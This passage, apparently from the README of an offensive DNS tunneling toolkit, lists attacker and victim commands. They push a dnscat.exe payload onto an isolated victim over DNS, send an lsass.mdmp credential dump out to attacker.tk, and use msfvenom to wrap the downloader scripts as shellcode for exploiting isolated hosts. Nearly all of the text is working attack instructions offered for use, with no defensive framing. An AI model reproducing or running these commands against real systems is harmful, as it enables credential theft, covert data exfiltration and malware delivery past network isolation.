Correct `yourzone.tk`.

### infiltration
Change loops count in `dns_download.vbs` before running.
```
attacker> sudo ./dns_upload.py --udp --file dnscat.exe
victim> cscript.exe dns_download.vbs
victim> ./dns_download.sh attacker.tk 1190 /tmp/dnscat
```

### exfiltration
```
attacker> sudo ./dns_download.py --udp --file lsass.mdmp
victim> cscript.exe dns_upload.vbs c:\path\to\lsass.mdmp attacker.tk
```

### dns-shellcode
It can be used as dns-shellcode alternative (with a bit changes) for exploiting isolated hosts:
```
msfvenom -p windows/exec CMD=$(cat dns_download.vbs) -f raw -o dns_shellcode
msfvenom -p linux/x86/exec CMD=$(cat dns_download.sh) -f raw -o dns_shellcode
```
